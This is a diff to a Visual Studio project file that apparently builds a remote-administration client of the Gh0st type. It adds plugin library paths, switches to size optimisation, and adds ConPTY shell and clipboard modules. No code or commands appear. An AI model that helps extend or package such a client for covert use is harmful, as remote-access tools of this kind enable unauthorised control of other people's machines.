@@ -108,6 +108,7 @@
       </EntryPointSymbol>
       <SubSystem>Console</SubSystem>
       <AdditionalOptions>/ignore:4099 %(AdditionalOptions)</AdditionalOptions>
+      <AdditionalLibraryDirectories>$(SolutionDir)..\SimplePlugins\bin</AdditionalLibraryDirectories>
     </Link>
   </ItemDefinitionGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
@@ -129,12 +130,13 @@
       </EntryPointSymbol>
       <SubSystem>Console</SubSystem>
       <AdditionalOptions>/ignore:4099 %(AdditionalOptions)</AdditionalOptions>
+      <AdditionalLibraryDirectories>$(SolutionDir)..\SimplePlugins\bin</AdditionalLibraryDirectories>
     </Link>
   </ItemDefinitionGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
     <ClCompile>
       <WarningLevel>Level3</WarningLevel>
-      <Optimization>MaxSpeed</Optimization>
+      <Optimization>MinSpace</Optimization>
       <FunctionLevelLinking>true</FunctionLevelLinking>
       <IntrinsicFunctions>true</IntrinsicFunctions>
       <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
@@ -152,12 +154,13 @@
       <SubSystem>Windows</SubSystem>
       <EntryPointSymbol>mainCRTStartup</EntryPointSymbol>
       <IgnoreSpecificDefaultLibraries>msvcrt.lib</IgnoreSpecificDefaultLibraries>
+      <AdditionalLibraryDirectories>$(SolutionDir)..\SimplePlugins\bin</AdditionalLibraryDirectories>
     </Link>
   </ItemDefinitionGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
     <ClCompile>
       <WarningLevel>Level3</WarningLevel>
-      <Optimization>MaxSpeed</Optimization>
+      <Optimization>MinSpace</Optimization>
       <FunctionLevelLinking>true</FunctionLevelLinking>
       <IntrinsicFunctions>true</IntrinsicFunctions>
       <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
@@ -174,6 +177,7 @@
       <AdditionalOptions> /SAFESEH:NO /ignore:4099 %(AdditionalOptions)</AdditionalOptions>
       <SubSystem>Windows</SubSystem>
       <EntryPointSymbol>mainCRTStartup</EntryPointSymbol>
+      <AdditionalLibraryDirectories>$(SolutionDir)..\SimplePlugins\bin</AdditionalLibraryDirectories>
     </Link>
   </ItemDefinitionGroup>
   <ItemGroup>
@@ -210,6 +214,7 @@
     <ClCompile Include="ServiceWrapper.c" />
     <ClCompile Include="SessionMonitor.c" />
     <ClCompile Include="ShellManager.cpp" />
+    <ClCompile Include="ConPTYManager.cpp" />
     <ClCompile Include="StdAfx.cpp" />
     <ClCompile Include="SystemManager.cpp" />
     <ClCompile Include="TalkManager.cpp" />
@@ -243,6 +248,7 @@
     <ClInclude Include="LoginServer.h" />
     <ClInclude Include="Manager.h" />
     <ClInclude Include="MemoryModule.h" />
+    <ClInclude Include="my_clip.h" />
     <ClInclude Include="proxy\ProxyManager.h" />
     <ClInclude Include="RegisterManager.h" />
     <ClInclude Include="RegisterOperation.h" />
@@ -256,6 +262,7 @@
     <ClInclude Include="ServiceWrapper.h" />
     <ClInclude Include="SessionMonitor.h" />
     <ClInclude Include="ShellManager.h" />
+    <ClInclude Include="ConPTYManager.h" />
     <ClInclude Include="StdAfx.h" />
     <ClInclude Include="SystemManager.h" />
     <ClInclude Include="TalkManager.h" />
